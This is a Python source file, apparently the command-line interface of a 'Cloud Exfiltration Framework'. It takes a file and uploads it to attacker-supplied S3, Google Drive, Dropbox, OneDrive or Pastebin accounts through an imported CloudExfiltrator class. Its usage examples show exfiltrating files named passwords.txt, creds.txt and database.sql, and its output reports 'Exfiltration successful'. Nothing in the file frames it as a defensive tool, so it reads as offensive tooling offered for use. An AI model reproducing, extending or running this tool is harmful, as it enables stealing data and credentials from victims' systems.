#!/usr/bin/env python3
"""
Command-line interface for cloud exfiltration
"""

import argparse
import sys
from .core import CloudExfiltrator

def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="Cloud Exfiltration Framework - Upload to cloud services",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # AWS S3
  cloud_exfil.py --file data.zip --service s3 \\
    --bucket my-bucket --aws-key KEY --aws-secret SECRET
  
  # Google Drive
  cloud_exfil.py --file passwords.txt --service gdrive \\
    --gdrive-creds credentials.json
  
  # Dropbox
  cloud_exfil.py --file database.sql --service dropbox \\
    --dropbox-token TOKEN
  
  # OneDrive
  cloud_exfil.py --file documents.zip --service onedrive \\
    --onedrive-token TOKEN
  
  # Pastebin (text only)
  cloud_exfil.py --file creds.txt --service pastebin \\
    --pastebin-key KEY
        """
    )
    
    parser.add_argument('--file', type=str, required=True,
                       help='File to exfiltrate')
    parser.add_argument('--service', type=str, 
                       choices=['s3', 'gdrive', 'dropbox', 'onedrive', 'pastebin'],
                       required=True,
                       help='Cloud service')
    
    # S3 arguments
    parser.add_argument('--bucket', type=str,
                       help='S3 bucket name')
    parser.add_argument('--aws-key', type=str,
                       help='AWS access key')
    parser.add_argument('--aws-secret', type=str,
                       help='AWS secret key')
    parser.add_argument('--region', type=str, default='us-east-1',
                       help='AWS region (default: us-east-1)')
    parser.add_argument('--object-name', type=str,
                       help='S3 object key (auto-generated if not specified)')
    
    # Google Drive arguments
    parser.add_argument('--gdrive-creds', type=str,
                       help='Google Drive credentials JSON file')
    parser.add_argument('--folder-id', type=str,
                       help='Google Drive folder ID')
    
    # Dropbox arguments
    parser.add_argument('--dropbox-token', type=str,
                       help='Dropbox access token')
    parser.add_argument('--dropbox-path', type=str,
                       help='Dropbox destination path')
    
    # OneDrive arguments
    parser.add_argument('--onedrive-token', type=str,
                       help='OneDrive access token')
    parser.add_argument('--onedrive-folder', type=str,
                       help='OneDrive destination folder')
    
    # Pastebin arguments
    parser.add_argument('--pastebin-key', type=str,
                       help='Pastebin API key')
    
    args = parser.parse_args()
    
    exfil = CloudExfiltrator()
    
    try:
        result = None
        
        if args.service == 's3':
            if not all([args.bucket, args.aws_key, args.aws_secret]):
                print("[!] S3 requires --bucket, --aws-key, --aws-secret")
                return 1
            
            result = exfil.exfil_to_s3(
                args.file, args.bucket, 
                args.aws_key, args.aws_secret,
                object_name=args.object_name,
                region=args.region
            )
        
        elif args.service == 'gdrive':
            if not args.gdrive_creds:
                print("[!] Google Drive requires --gdrive-creds")
                return 1
            
            result = exfil.exfil_to_google_drive(
                args.file, args.gdrive_creds,
                folder_id=args.folder_id
            )
        
        elif args.service == 'dropbox':
            if not args.dropbox_token:
                print("[!] Dropbox requires --dropbox-token")
                return 1
            
            result = exfil.exfil_to_dropbox(
                args.file, args.dropbox_token,
                dest_path=args.dropbox_path
            )
        
        elif args.service == 'onedrive':
            if not args.onedrive_token:
                print("[!] OneDrive requires --onedrive-token")
                return 1
            
            result = exfil.exfil_to_onedrive(
                args.file, args.onedrive_token,
                dest_folder=args.onedrive_folder
            )
        
        elif args.service == 'pastebin':
            result = exfil.exfil_via_pastebin(
                args.file, args.pastebin_key,
                is_file=True
            )
        
        if result:
            print(f"\n[+] Exfiltration successful!")
            return 0
        else:
            print(f"\n[-] Exfiltration failed")
            return 1
    
    except FileNotFoundError as e:
        print(f"\n[-] Error: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[-] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())